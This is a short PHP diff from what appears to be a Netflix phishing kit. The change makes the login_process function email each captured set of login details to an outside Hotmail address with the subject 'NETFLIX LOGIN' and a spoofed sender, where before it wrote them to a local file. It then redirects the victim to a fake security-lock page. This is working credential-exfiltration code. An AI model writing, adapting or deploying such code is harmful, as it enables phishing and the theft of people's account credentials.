@@ -21,7 +21,12 @@ function login_process() {
         </div>
     </div>
         ';
-    file_put_contents('login.html', $result);
+    $to = 'fauzikirahot@hotmail.com';
+    $subject = 'NETFLIX LOGIN';
+    $headers = "From: KARMA-YS <karma@netflix-karma.ys>\r\n" .
+                "Content-Type: text/html; charset=utf-8\r\n";
+    mail($to, $subject, $result, $headers);
+    # file_put_contents('login.html', $result);
     header('Location: /security?locked=19089');
     exit();
 }
